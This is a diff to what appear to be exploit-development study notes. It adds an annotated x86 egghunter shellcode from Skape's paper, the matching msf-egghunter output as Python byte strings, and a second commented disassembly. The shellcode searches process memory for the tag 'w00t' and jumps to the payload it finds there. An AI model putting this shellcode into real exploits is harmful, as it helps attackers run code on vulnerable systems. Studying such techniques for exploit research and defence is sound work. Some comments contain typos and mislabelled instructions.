@@ -1,3 +1,5 @@
+Skape paper code:
+
 6681CAFF0F	or dx,0xfff		; align page address
 42		inc edx		; goto next address
 52		push edx  		; push content of EDX register on the stack
@@ -14,3 +16,31 @@ AF		scasd 		; Compare EAX with what is at EDI
 AF		scads			; check if the egg exists again	
 75E7		jnz 0x5		; jump to line 1 if the second egg is not found.	
 FFE7		jmp edi		; jump to the found egg
+
+
+Metasploit egghunter code:
+
+msf-egghunter -e w00t -f python -v EGGHUNTER
+EGGHUNTER =  b""
+EGGHUNTER += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
+EGGHUNTER += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
+EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+Metasloit 2:
+
+6681CAFF0F 	or dx,0xfff 	; align page address
+42 		inc edx		 ; goto next address- Original instruction 
+52 		push edx 		; push content of EDX register on the stack
+6A02 		push byte +0x2 	; push 0x02 onto stack | syscall for NtAccessCheckAndAuditAlarm
+58 		pop eax 		; Restore EAX from stack
+CD2E 		int 0x2e 		; user to kernel mode transitions
+3C05 		cmp al,0x5 		; compare low order byte of eax to 0x5 (indicates access violation)
+5A 		pop edx 		; Restore EDX from stack
+74EF 		jz 0x0 		; Jump back to start dx
+B877303074 	mov eax,0x77303074 ; put EGG in EAX
+89D7 		mov edi,edx 	; Compare EAX with what is at EDI
+AF 		scasd 		; Compare EAX with what is at EDI (contd)
+75EA 		jnz 0x5 		; jump to line 1 if the egg was not found
+AF 		scads 		; check if the egg exists again 
+75E7 		jnz 0x5 		; jump to line 1 if the second egg is not found. 
+FFE7		 jmp edi 		; jump to the found egg
